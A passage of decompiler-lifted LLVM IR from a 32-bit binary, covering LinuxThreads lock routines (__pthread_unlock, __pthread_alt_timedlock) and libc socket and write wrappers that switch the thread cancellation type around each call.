  %v3_80576ec27 = load i32, i32* %v2_80576ec26, align 4
  %v4_80576ec28 = icmp eq i32 %v3_80576ec27, 0
  br i1 %v4_80576ec28, label %dec_label_pc_80576a5, label %dec_label_pc_80576f2

dec_label_pc_80576f2:                             ; preds = %dec_label_pc_80576e5.preheader, %dec_label_pc_80576f2
  %v0_80576ec29 = phi i32 [ %v0_80576ec, %dec_label_pc_80576f2 ], [ %v0_80576ec24, %dec_label_pc_80576e5.preheader ]
  %v0_80576f2 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80576f2 = add i32 %v0_80576f2, 1
  store i32 %v1_80576f2, i32* %ebp.global-to-local, align 4
  store i32 %v0_80576ec29, i32* @eax, align 4
  %v2_80576e7 = call i32 @suspend.9(i32 %v0_8057682, i32 %v0_8057681)
  %v0_80576ec = load i32, i32* @edi, align 4
  %v1_80576ec = add i32 %v0_80576ec, 12
  %v2_80576ec = inttoptr i32 %v1_80576ec to i32*
  %v3_80576ec = load i32, i32* %v2_80576ec, align 4
  %v4_80576ec = icmp eq i32 %v3_80576ec, 0
  br i1 %v4_80576ec, label %dec_label_pc_80576a5, label %dec_label_pc_80576f2

dec_label_pc_80576f5:                             ; preds = %dec_label_pc_80576fc.preheader, %dec_label_pc_80576f5
  %v0_80576f5 = load i32, i32* @edi, align 4
  store i32 %v0_80576f5, i32* @eax, align 4
  %v0_80576f7 = call i32 @restart.7()
  %v0_80576fc = load i32, i32* %ebp.global-to-local, align 4
  %v1_80576fc = add i32 %v0_80576fc, -1
  store i32 %v1_80576fc, i32* %ebp.global-to-local, align 4
  %v10_80576fd = icmp eq i32 %v0_80576fc, 0
  %v1_8057700 = icmp eq i1 %v10_80576fd, false
  br i1 %v1_8057700, label %dec_label_pc_80576f5, label %dec_label_pc_8057702

dec_label_pc_8057702:                             ; preds = %dec_label_pc_80576fc.preheader, %dec_label_pc_80576f5, %dec_label_pc_805768f
  %v0_8057709 = phi i32 [ %v2_8057698, %dec_label_pc_805768f ], [ %v0_80576d4, %dec_label_pc_80576fc.preheader ], [ %v0_80576f7, %dec_label_pc_80576f5 ]
  store i32 %v0_8057682, i32* @ebx, align 4
  store i32 %v0_8057681, i32* @esi, align 4
  store i32 %v0_8057680, i32* @edi, align 4
  ret i32 %v0_8057709

; uselistorder directives
  uselistorder i32 %v0_80576ec, { 1, 0 }
  uselistorder i1 %v15_80576d6, { 1, 2, 0 }
  uselistorder i32 %v2_80576d6, { 1, 0 }
  uselistorder i32 %v0_80576c6, { 1, 0, 2 }
  uselistorder i32 %v2_80576a5, { 2, 1, 0, 3 }
  uselistorder i1 %v15_8057698, { 1, 0, 2 }
  uselistorder i32 %v2_8057698, { 0, 2, 1 }
  uselistorder i32 %v0_8057682, { 1, 2, 0 }
  uselistorder i32 %v0_8057681, { 1, 2, 0 }
  uselistorder i32* %ecx.global-to-local, { 3, 2, 4, 0, 1 }
  uselistorder i32* %ebp.global-to-local, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder label %dec_label_pc_8057702, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80576f5, { 1, 0 }
  uselistorder label %dec_label_pc_80576f2, { 1, 0 }
  uselistorder label %dec_label_pc_80576d4, { 1, 0 }
  uselistorder label %dec_label_pc_80576cd, { 1, 0 }
  uselistorder label %dec_label_pc_80576c6, { 1, 0 }
  uselistorder label %dec_label_pc_80576a5, { 1, 2, 0, 3 }
}

define i32 @__pthread_unlock(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp27 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_805770d = load i32, i32* @ebx, align 4
  store i32 %v0_805770d, i32* %stack_var_-16, align 4
  store i32 %tmp27, i32* @ecx, align 4
  br label %dec_label_pc_8057726

dec_label_pc_8057717:                             ; preds = %dec_label_pc_8057726
  %v2_805771b = load i32, i32* %v1_8057726, align 4
  %v15_805771b = icmp eq i32 %v2_805771b, 1
  %v22_805771b = select i1 %v15_805771b, i32 0, i32 %v2_805771b
  store i32 %v22_805771b, i32* %v1_8057726, align 4
  %v1_805771f = zext i1 %v15_805771b to i32
  %v2_805771f = load i32, i32* %edx.global-to-local, align 4
  %v3_805771f = and i32 %v2_805771f, -256
  %v4_805771f = or i32 %v3_805771f, %v1_805771f
  store i32 %v4_805771f, i32* @edx, align 4
  %v4_8057722 = icmp eq i1 %v15_805771b, false
  %v1_8057724 = icmp eq i1 %v4_8057722, false
  br i1 %v1_8057724, label %dec_label_pc_805779e.loopexit, label %dec_label_pc_8057726.backedge

dec_label_pc_8057726.backedge:                    ; preds = %dec_label_pc_8057717, %dec_label_pc_805775f
  %v0_8057726.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8057726

dec_label_pc_8057726:                             ; preds = %dec_label_pc_8057726.backedge, %entry
  %v0_805771b = phi i32 [ %v0_8057726.pre, %dec_label_pc_8057726.backedge ], [ %tmp27, %entry ]
  %v1_8057726 = inttoptr i32 %v0_805771b to i32*
  %v2_8057726 = load i32, i32* %v1_8057726, align 4
  store i32 %v2_8057726, i32* %edx.global-to-local, align 4
  %v9_8057728 = icmp eq i32 %v2_8057726, 1
  br i1 %v9_8057728, label %dec_label_pc_8057717, label %dec_label_pc_805772d

dec_label_pc_805772d:                             ; preds = %dec_label_pc_8057726
  %v1_805772f = and i32 %v2_8057726, -2
  store i32 %v1_805772f, i32* %edi.global-to-local, align 4
  %v1_80577573 = icmp eq i32 %v1_805772f, 0
  %v1_805775910 = icmp eq i1 %v1_80577573, false
  br i1 %v1_805775910, label %dec_label_pc_8057741, label %dec_label_pc_805775f

dec_label_pc_8057741:                             ; preds = %dec_label_pc_805772d, %dec_label_pc_805774e
  %v0_805775b26 = phi i32 [ %v0_805775b25, %dec_label_pc_805774e ], [ %v0_805771b, %dec_label_pc_805772d ]
  %v0_8057749 = phi i32 [ %v1_805774e, %dec_label_pc_805774e ], [ %v0_805771b, %dec_label_pc_805772d ]
  %v3_8057744 = phi i32 [ %v3_805774421, %dec_label_pc_805774e ], [ 0, %dec_label_pc_805772d ]
  %v0_805774e = phi i32 [ %v1_8057754, %dec_label_pc_805774e ], [ %v1_805772f, %dec_label_pc_805772d ]
  %v1_8057741 = add i32 %v0_805774e, 24
  %v2_8057741 = inttoptr i32 %v1_8057741 to i32*
  %v3_8057741 = load i32, i32* %v2_8057741, align 4
  store i32 %v3_8057741, i32* @ebx, align 4
  %v5_8057747 = icmp slt i32 %v3_8057741, %v3_8057744
  br i1 %v5_8057747, label %dec_label_pc_805774e, label %dec_label_pc_8057749

dec_label_pc_8057749:                             ; preds = %dec_label_pc_8057741
  br label %dec_label_pc_805774e

dec_label_pc_805774e:                             ; preds = %dec_label_pc_8057741, %dec_label_pc_8057749
  %v0_805775b25 = phi i32 [ %v0_805775b26, %dec_label_pc_8057741 ], [ %v0_8057749, %dec_label_pc_8057749 ]
  %v3_805774421 = phi i32 [ %v3_8057744, %dec_label_pc_8057741 ], [ %v3_8057741, %dec_label_pc_8057749 ]
  %v1_805774e = add i32 %v0_805774e, 12
  %v2_8057751 = inttoptr i32 %v1_805774e to i32*
  %v3_8057751 = load i32, i32* %v2_8057751, align 4
  %v1_8057754 = and i32 %v3_8057751, -2
  %v1_8057757 = icmp eq i32 %v1_8057754, 0
  %v1_8057759 = icmp eq i1 %v1_8057757, false
  br i1 %v1_8057759, label %dec_label_pc_8057741, label %dec_label_pc_805775b

dec_label_pc_805775b:                             ; preds = %dec_label_pc_805774e
  %v12_805775b = icmp eq i32 %v0_805775b25, %v0_805771b
  %v1_805775d = icmp eq i1 %v12_805775b, false
  br i1 %v1_805775d, label %dec_label_pc_8057774, label %dec_label_pc_805775f

dec_label_pc_805775f:                             ; preds = %dec_label_pc_805772d, %dec_label_pc_805775b
  %v1_805775f = add i32 %v1_805772f, 12
  %v2_805775f = inttoptr i32 %v1_805775f to i32*
  %v3_805775f = load i32, i32* %v2_805775f, align 4
  %v1_8057764 = and i32 %v3_805775f, -2
  store i32 %v1_8057764, i32* @ebx, align 4
  %v2_8057767 = load i32, i32* %v1_8057726, align 4
  %v15_8057767 = icmp eq i32 %v2_8057726, %v2_8057767
  %v22_8057767 = select i1 %v15_8057767, i32 %v1_8057764, i32 %v2_8057767
  store i32 %v22_8057767, i32* %v1_8057726, align 4
  %v1_805776b = zext i1 %v15_8057767 to i32
  %v2_805776b = load i32, i32* %edx.global-to-local, align 4
  %v3_805776b = and i32 %v2_805776b, -256
  %v4_805776b = or i32 %v3_805776b, %v1_805776b
  store i32 %v4_805776b, i32* %edx.global-to-local, align 4
  %v4_805776e = icmp eq i1 %v15_8057767, false
  br i1 %v4_805776e, label %dec_label_pc_8057726.backedge, label %dec_label_pc_8057790

dec_label_pc_8057774:                             ; preds = %dec_label_pc_805775b
  %v1_8057774 = inttoptr i32 %v0_805775b25 to i32*
  %v2_8057774 = load i32, i32* %v1_8057774, align 4
  %v1_8057776 = and i32 %v2_8057774, -2
  store i32 %v1_8057776, i32* %edi.global-to-local, align 4
  %v1_8057779 = add i32 %v1_8057776, 12
  %v2_8057779 = inttoptr i32 %v1_8057779 to i32*
  %v3_8057779 = load i32, i32* %v2_8057779, align 4
  store i32 %v3_8057779, i32* %v1_8057774, align 4
  br label %dec_label_pc_805777e

dec_label_pc_805777e:                             ; preds = %dec_label_pc_805777e, %dec_label_pc_8057774
  %v0_805777e = load i32, i32* @ecx, align 4
  %v1_805777e = inttoptr i32 %v0_805777e to i32*
  %v2_805777e = load i32, i32* %v1_805777e, align 4
  %v1_8057782 = and i32 %v2_805777e, -2
  store i32 %v1_8057782, i32* %edx.global-to-local, align 4
  %v2_8057785 = load i32, i32* %v1_805777e, align 4
  %v15_8057785 = icmp eq i32 %v2_805777e, %v2_8057785
  %v22_8057785 = select i1 %v15_8057785, i32 %v1_8057782, i32 %v2_8057785
  store i32 %v22_8057785, i32* %v1_805777e, align 4
  %v1_8057789 = zext i1 %v15_8057785 to i32
  %v2_8057789 = load i32, i32* %edx.global-to-local, align 4
  %v3_8057789 = and i32 %v2_8057789, -256
  %v4_8057789 = or i32 %v3_8057789, %v1_8057789
  store i32 %v4_8057789, i32* %edx.global-to-local, align 4
  %v4_805778c = icmp eq i1 %v15_8057785, false
  br i1 %v4_805778c, label %dec_label_pc_805777e, label %dec_label_pc_8057790

dec_label_pc_8057790:                             ; preds = %dec_label_pc_805775f, %dec_label_pc_805777e
  %v0_8057790 = load i32, i32* %edi.global-to-local, align 4
  %v1_8057790 = add i32 %v0_8057790, 12
  %v2_8057790 = inttoptr i32 %v1_8057790 to i32*
  store i32 0, i32* %v2_8057790, align 4
  %v0_8057797 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_8057797, i32* @eax, align 4
  %v0_8057799 = call i32 @restart.7()
  br label %dec_label_pc_805779e

dec_label_pc_805779e.loopexit:                    ; preds = %dec_label_pc_8057717
  br label %dec_label_pc_805779e

dec_label_pc_805779e:                             ; preds = %dec_label_pc_805779e.loopexit, %dec_label_pc_8057790
  %v2_80577a3 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80577a3, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i1 %v15_8057785, { 1, 2, 0 }
  uselistorder i32 %v2_8057785, { 1, 0 }
  uselistorder i1 %v15_8057767, { 1, 2, 0 }
  uselistorder i32 %v2_8057767, { 1, 0 }
  uselistorder i32 %v1_8057754, { 1, 0 }
  uselistorder i32 %v1_805774e, { 1, 0 }
  uselistorder i32 %v3_8057744, { 1, 0 }
  uselistorder i32 %v1_805772f, { 1, 0, 2, 3 }
  uselistorder i32* %v1_8057726, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v0_805771b, { 2, 0, 1, 3 }
  uselistorder i1 %v15_805771b, { 1, 2, 0 }
  uselistorder i32 %v2_805771b, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32* %edi.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32 ()* @restart.7, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057790, { 1, 0 }
  uselistorder label %dec_label_pc_805775f, { 1, 0 }
  uselistorder label %dec_label_pc_805774e, { 1, 0 }
  uselistorder label %dec_label_pc_8057741, { 1, 0 }
  uselistorder label %dec_label_pc_8057726.backedge, { 1, 0 }
}

define i32 @__pthread_alt_timedlock(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %v0_80577aa = load i32, i32* @esi, align 4
  %v0_80577ab = load i32, i32* @ebx, align 4
  store i32 ptrtoint (i32* @global_var_807a61c.692 to i32), i32* @eax, align 4
  store i32 0, i32* @esi, align 4
  store i32 %tmp7, i32* @edi, align 4
  store i32 %arg2, i32* @ebp, align 4
  %v1_80577be = call i32 @__pthread_acquire(i32 %v0_80577ab)
  %v0_80577c3 = load i32, i32* @global_var_807a618.693, align 8
  %v1_80577c8 = icmp eq i32 %v0_80577c3, 0
  br i1 %v1_80577c8, label %dec_label_pc_80577d5, label %dec_label_pc_80577d5.thread

dec_label_pc_80577d5.thread:                      ; preds = %entry
  store i32 %v0_80577c3, i32* @esi, align 4
  %v1_80577ce = inttoptr i32 %v0_80577c3 to i32*
  %v2_80577ce = load i32, i32* %v1_80577ce, align 4
  store i32 %v2_80577ce, i32* @global_var_807a618.693, align 8
  store i32 0, i32* @global_var_807a61c.692, align 4
  br label %dec_label_pc_8057809

dec_label_pc_80577d5:                             ; preds = %entry
  %v0_80577df.pre = load i32, i32* @esi, align 4
  store i32 0, i32* @global_var_807a61c.692, align 4
  %v1_80577df = icmp eq i32 %v0_80577df.pre, 0
  %v1_80577e1 = icmp eq i1 %v1_80577df, false
  br i1 %v1_80577e1, label %dec_label_pc_8057809, label %dec_label_pc_80577e3

dec_label_pc_80577e3:                             ; preds = %dec_label_pc_80577d5
  store i32 12, i32* %stack_var_-44, align 4
  %v1_80577e8 = call i32 @malloc(i32 12)
  store i32 %v1_80577e8, i32* @esi, align 4
  %v1_80577f2 = icmp eq i32 %v1_80577e8, 0
  %v1_80577f4 = icmp eq i1 %v1_80577f2, false
  br i1 %v1_80577f4, label %dec_label_pc_8057809, label %dec_label_pc_80577f6

dec_label_pc_80577f6:                             ; preds = %dec_label_pc_80577e3
  %v0_80577f9 = load i32, i32* @edi, align 4
  store i32 %v0_80577f9, i32* %stack_var_-44, align 4
  %v3_80577fa = inttoptr i32 %v0_80577f9 to i32*
  %v4_80577fa = call i32 @__pthread_alt_lock(i32* %v3_80577fa, i32 %v1_80577e8, i32 %v1_80577e8)
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805786f

dec_label_pc_8057809:                             ; preds = %dec_label_pc_80577d5.thread, %dec_label_pc_80577e3, %dec_label_pc_80577d5, %dec_label_pc_8057824
  %v0_8057809 = load i32, i32* @edi, align 4
  %v1_8057809 = inttoptr i32 %v0_8057809 to i32*
  %v2_8057809 = load i32, i32* %v1_8057809, align 4
  store i32 %v2_8057809, i32* @ebx, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8057810 = icmp eq i32 %v2_8057809, 0
  br i1 %v1_8057810, label %dec_label_pc_8057809.dec_label_pc_8057824_crit_edge, label %dec_label_pc_8057814

dec_label_pc_8057809.dec_label_pc_8057824_crit_edge: ; preds = %dec_label_pc_8057809
  %v0_8057824.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8057824

dec_label_pc_8057814:                             ; preds = %dec_label_pc_8057809
  %v0_8057814 = load i32, i32* @ebp, align 4
  %v1_8057814 = icmp eq i32 %v0_8057814, 0
  %v1_8057816 = icmp eq i1 %v1_8057814, false
  br i1 %v1_8057816, label %dec_label_pc_805781f, label %dec_label_pc_8057818

dec_label_pc_8057818:                             ; preds = %dec_label_pc_8057814
  %v0_8057818 = call i32 @thread_self.8()
  store i32 %v0_8057818, i32* @ebp, align 4
  br label %dec_label_pc_805781f

dec_label_pc_805781f:                             ; preds = %dec_label_pc_8057814, %dec_label_pc_8057818
  %v0_805781f = phi i32 [ %v0_8057814, %dec_label_pc_8057814 ], [ %v0_8057818, %dec_label_pc_8057818 ]
  %v1_805781f = load i32, i32* @esi, align 4
  %v2_805781f = add i32 %v1_805781f, 4
  %v3_805781f = inttoptr i32 %v2_805781f to i32*
  store i32 %v0_805781f, i32* %v3_805781f, align 4
  %v0_8057822 = load i32, i32* @esi, align 4
  store i32 %v0_8057822, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057824

dec_label_pc_8057824:                             ; preds = %dec_label_pc_8057809.dec_label_pc_8057824_crit_edge, %dec_label_pc_805781f
  %v0_8057824 = phi i32 [ %v0_8057824.pre, %dec_label_pc_8057809.dec_label_pc_8057824_crit_edge ], [ %v0_8057822, %dec_label_pc_805781f ]
  %v1_8057824 = add i32 %v0_8057824, 8
  %v2_8057824 = inttoptr i32 %v1_8057824 to i32*
  store i32 0, i32* %v2_8057824, align 4
  %v1_805782b = load i32, i32* @esi, align 4
  %v2_805782b = inttoptr i32 %v1_805782b to i32*
  store i32 %v2_8057809, i32* %v2_805782b, align 4
  %v0_805782f = load i32, i32* @edi, align 4
  %v1_805782f = inttoptr i32 %v0_805782f to i32*
  %v2_805782f = load i32, i32* %v1_805782f, align 4
  %v3_805782f = load i32, i32* %edx.global-to-local, align 4
  %v15_805782f = icmp eq i32 %v2_8057809, %v2_805782f
  %v22_805782f = select i1 %v15_805782f, i32 %v3_805782f, i32 %v2_805782f
  store i32 %v22_805782f, i32* %v1_805782f, align 4
  %v1_8057833 = zext i1 %v15_805782f to i32
  %v2_8057833 = load i32, i32* %edx.global-to-local, align 4
  %v3_8057833 = and i32 %v2_8057833, -256
  %v4_8057833 = or i32 %v3_8057833, %v1_8057833
  store i32 %v4_8057833, i32* %edx.global-to-local, align 4
  %v4_8057836 = icmp eq i1 %v15_805782f, false
  br i1 %v4_8057836, label %dec_label_pc_8057809, label %dec_label_pc_805783a

dec_label_pc_805783a:                             ; preds = %dec_label_pc_8057824
  br i1 %v1_8057810, label %dec_label_pc_8057863, label %dec_label_pc_805783e

dec_label_pc_805783e:                             ; preds = %dec_label_pc_805783a
  %v0_805783e = load i32, i32* @edi, align 4
  %v0_8057844 = load i32, i32* @ebp, align 4
  store i32 %v0_8057844, i32* %stack_var_-44, align 4
  %v3_8057845 = inttoptr i32 %v0_805783e to i32*
  %v4_8057845 = call i32 @__pthread_timedsuspend_new(i32 %arg3, i32* %v3_8057845, i32 %v0_805783e)
  %v1_805784d = icmp eq i32 %v4_8057845, 0
  %v1_805784f = icmp eq i1 %v1_805784d, false
  br i1 %v1_805784f, label %dec_label_pc_8057863, label %dec_label_pc_8057851

dec_label_pc_8057851:                             ; preds = %dec_label_pc_805783e
  %v1_8057851 = and i32 %v4_8057845, -256
  %v2_8057851 = or i32 %v1_8057851, 1
  %v0_8057853 = load i32, i32* @esi, align 4
  %v1_8057853 = add i32 %v0_8057853, 8
  %v2_8057853 = inttoptr i32 %v1_8057853 to i32*
  %v3_8057853 = load i32, i32* %v2_8057853, align 4
  store i32 %v2_8057851, i32* %v2_8057853, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8057858 = icmp eq i32 %v3_8057853, 0
  br i1 %v1_8057858, label %dec_label_pc_805786f, label %dec_label_pc_805785c

dec_label_pc_805785c:                             ; preds = %dec_label_pc_8057851
  %v0_805785c = load i32, i32* @ebp, align 4
  store i32 %v0_805785c, i32* @eax, align 4
  %v0_805785e = load i32, i32* %stack_var_-44, align 4
  %v2_805785e = call i32 @suspend.9(i32 %v0_805785e, i32 %arg3)
  br label %dec_label_pc_8057863

dec_label_pc_8057863:                             ; preds = %dec_label_pc_805783e, %dec_label_pc_805783a, %dec_label_pc_805785c
  %v0_8057863 = load i32, i32* @esi, align 4
  store i32 %v0_8057863, i32* @eax, align 4
  %v0_8057865 = call i32 @wait_node_free()
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805786f

dec_label_pc_805786f:                             ; preds = %dec_label_pc_8057851, %dec_label_pc_80577f6, %dec_label_pc_8057863
  %v0_8057872 = phi i32 [ 0, %dec_label_pc_8057851 ], [ 1, %dec_label_pc_80577f6 ], [ 1, %dec_label_pc_8057863 ]
  store i32 %v0_80577ab, i32* @ebx, align 4
  store i32 %v0_80577aa, i32* @esi, align 4
  ret i32 %v0_8057872

; uselistorder directives
  uselistorder i1 %v15_805782f, { 1, 2, 0 }
  uselistorder i32 %v2_805782f, { 1, 0 }
  uselistorder i32 %v1_80577e8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80577c3, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 4, 5, 3, 6, 7 }
  uselistorder i32 ()* @wait_node_free, { 1, 0 }
  uselistorder i32 (i32, i32)* @suspend.9, { 3, 1, 0, 2 }
  uselistorder i32 ()* @thread_self.8, { 2, 0, 1 }
  uselistorder i32 (i32)* @__pthread_acquire, { 1, 0 }
  uselistorder i32* @global_var_807a61c.692, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805786f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057863, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057824, { 1, 0 }
  uselistorder label %dec_label_pc_805781f, { 1, 0 }
  uselistorder label %dec_label_pc_8057809, { 3, 1, 2, 0 }
}

define i32 @sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805787c = load i32, i32* @ebx, align 4
  store i32 %v0_805787c, i32* %stack_var_-4, align 4
  %v2_8057880 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057887 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057880)
  %v6_80578a6 = call i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6)
  store i32 %v6_80578a6, i32* @ebx, align 4
  %v3_80578b2 = load i32, i32* %stack_var_-8, align 4
  %v2_80578b6 = trunc i32 %v3_80578b2 to i8
  %v3_80578b6 = call i32 @__GI_pthread_setcanceltype(i8 %v2_80578b6, i32 0)
  %v0_80578bb = load i32, i32* @ebx, align 4
  %v2_80578c0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80578c0, i32* @ebx, align 4
  ret i32 %v0_80578bb
}

define i32 @sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_80578c6 = ptrtoint i32* %stack_var_-8 to i32
  %v3_80578cd = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_80578c6)
  %v3_80578e1 = call i32 @__libc_sendmsg(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v3_80578e1, i32* @ebx, align 4
  %v3_80578ec = load i32, i32* %stack_var_-8, align 4
  %v2_80578f0 = trunc i32 %v3_80578ec to i8
  %v3_80578f0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_80578f0, i32 0)
  %v0_80578f5 = load i32, i32* @ebx, align 4
  ret i32 %v0_80578f5
}

define i32 @send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80578fc = load i32, i32* @ebx, align 4
  store i32 %v0_80578fc, i32* %stack_var_-4, align 4
  %v2_8057900 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057907 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057900)
  %v4_805791c = call i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_805791c, i32* @ebx, align 4
  %v3_8057928 = load i32, i32* %stack_var_-8, align 4
  %v2_805792c = trunc i32 %v3_8057928 to i8
  %v3_805792c = call i32 @__GI_pthread_setcanceltype(i8 %v2_805792c, i32 0)
  %v0_8057931 = load i32, i32* @ebx, align 4
  %v2_8057936 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057936, i32* @ebx, align 4
  ret i32 %v0_8057931
}

define i32 @recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_805793c = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057943 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_805793c)
  %v3_8057957 = call i32 @__libc_recvmsg(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_8057957, i32* @ebx, align 4
  %v3_8057962 = load i32, i32* %stack_var_-8, align 4
  %v2_8057966 = trunc i32 %v3_8057962 to i8
  %v3_8057966 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057966, i32 0)
  %v0_805796b = load i32, i32* @ebx, align 4
  ret i32 %v0_805796b
}

define i32 @recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8057976 = ptrtoint i32* %stack_var_-8 to i32
  %v3_805797d = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057976)
  store i32 %v2_8057976, i32* @ebx, align 4
  %v6_805799c = call i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6)
  store i32 %v6_805799c, i32* @ebx, align 4
  %v3_80579a8 = load i32, i32* %stack_var_-8, align 4
  %v2_80579ac = trunc i32 %v3_80579a8 to i8
  %v3_80579ac = call i32 @__GI_pthread_setcanceltype(i8 %v2_80579ac, i32 0)
  %v0_80579b1 = load i32, i32* @ebx, align 4
  ret i32 %v0_80579b1
}

define i32 @recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80579b8 = load i32, i32* @ebx, align 4
  store i32 %v0_80579b8, i32* %stack_var_-4, align 4
  %v2_80579bc = ptrtoint i32* %stack_var_-8 to i32
  %v3_80579c3 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_80579bc)
  %v4_80579d8 = call i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_80579d8, i32* @ebx, align 4
  %v3_80579e4 = load i32, i32* %stack_var_-8, align 4
  %v2_80579e8 = trunc i32 %v3_80579e4 to i8
  %v3_80579e8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_80579e8, i32 0)
  %v0_80579ed = load i32, i32* @ebx, align 4
  %v2_80579f2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80579f2, i32* @ebx, align 4
  ret i32 %v0_80579ed
}

define i32 @connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80579f4 = load i32, i32* @ebx, align 4
  store i32 %v0_80579f4, i32* %stack_var_-4, align 4
  %v2_80579f8 = ptrtoint i32* %stack_var_-8 to i32
  %v3_80579ff = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_80579f8)
  %v3_8057a13 = call i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_8057a13, i32* @ebx, align 4
  %v3_8057a1e = load i32, i32* %stack_var_-8, align 4
  %v2_8057a22 = trunc i32 %v3_8057a1e to i8
  %v3_8057a22 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057a22, i32 0)
  %v0_8057a27 = load i32, i32* @ebx, align 4
  %v2_8057a2c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057a2c, i32* @ebx, align 4
  ret i32 %v0_8057a27
}

define i32 @accept(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057a2e = load i32, i32* @ebx, align 4
  store i32 %v0_8057a2e, i32* %stack_var_-4, align 4
  %v2_8057a32 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057a39 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057a32)
  %v3_8057a4d = call i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v3_8057a4d, i32* @ebx, align 4
  %v3_8057a58 = load i32, i32* %stack_var_-8, align 4
  %v2_8057a5c = trunc i32 %v3_8057a58 to i8
  %v3_8057a5c = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057a5c, i32 0)
  %v0_8057a61 = load i32, i32* @ebx, align 4
  %v2_8057a66 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057a66, i32* @ebx, align 4
  ret i32 %v0_8057a61
}

define i32 @write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057a68 = load i32, i32* @ebx, align 4
  store i32 %v0_8057a68, i32* %stack_var_-4, align 4
  %v2_8057a6c = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057a73 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057a6c)
